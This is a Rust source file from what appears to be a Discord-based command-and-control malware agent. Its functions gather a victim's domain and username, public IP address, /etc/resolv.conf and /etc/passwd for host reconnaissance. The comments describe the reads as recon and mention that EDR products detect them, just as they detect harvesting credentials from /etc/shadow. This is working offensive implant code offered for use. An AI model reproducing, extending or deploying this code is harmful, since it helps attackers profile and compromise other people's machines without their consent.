use crate::errors::DiscordC2Error;
use public_ip_addr::get_public_ip;
use std::{env, fs};
use std::path::Path;

/// Retrieves the user information used during agent initialization.
///
/// This function is used by the `get_or_create_agent` function in the `agent.rs` file
/// to fetch the domain and username of the current user.
///
/// # Returns
///
/// A `String` containing the user information in the format "domain:user".
#[cfg(target_os = "windows")]
pub fn user() -> String {
    let domain = env::var("USERDOMAIN").unwrap_or("Unknown Hostname".to_string());
    let user = env::var("USERNAME").unwrap_or("Unknown User".to_string());

    format!("{}:{}", &domain, &user)
}

#[cfg(target_os = "linux")]
pub fn user() -> String {
    // linux does not really have a concept of AD domains, just return the hostname
    // from /etc/hostname which usually has a FQDN
    let binding =
        fs::read_to_string(Path::new("/etc/hostname")).unwrap_or("Unknown Hostname".to_string());
    let hostname = binding.trim(); // /etc/hostname has a newline at EOF, need to trim it
    let user = env::var("USER").unwrap_or("Unknown User".parse().unwrap());

    format!("{}:{}", &hostname, &user)
}

/// Retrieves the public IP address during agent initialization.
///
/// This function is used by the `get_or_create_agent` function in the `agent.rs` file
/// to fetch the public IP address of the agent.
///
/// # Returns
///
/// The public IP address as a `String`, or an `Err` of type `DiscordC2Error` if there was an error.
pub async fn ip() -> Result<String, DiscordC2Error> {
    let ip = get_public_ip()
        .await
        .map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;
    Ok(ip)
}

/// even though the concept of AD doesn't fully exist on linux, you can still kinda domain-join a linux machine to an
/// AD domain using 3rd-party tools. one of those steps involve using your domain controller's DNS server. we want to
/// get the contents of the glibc DNS resolver file /etc/resolv.conf for a potential Windows domain controller DNS server.
/// userspace software MUST be able to read /etc/resolv.conf, otherwise DNS resolution would be broken. this is always
/// available.
#[cfg(target_os = "linux")]
pub fn get_resolv_conf() -> String {
    let resolv_conf = Path::new("/etc/resolv.conf");
    let file = fs::read_to_string(resolv_conf).unwrap_or("Unknown".to_string());

    file
}

/// /etc/passwd contains valuable information about the users on the machine such as the default shells, if accounts are
/// locked, the default HOME directories per account, the description of the accounts, their user ID, and group ID.
/// warning: EDRs WILL detect any attempts at reading /etc/passwd for recon, just like /etc/shadow for cred harvesting
#[cfg(target_os = "linux")]
pub fn get_etc_passwd() -> String {
    let etc_passwd = Path::new("/etc/passwd");
    let file = fs::read_to_string(etc_passwd).unwrap_or("Unknown".to_string());

    file
}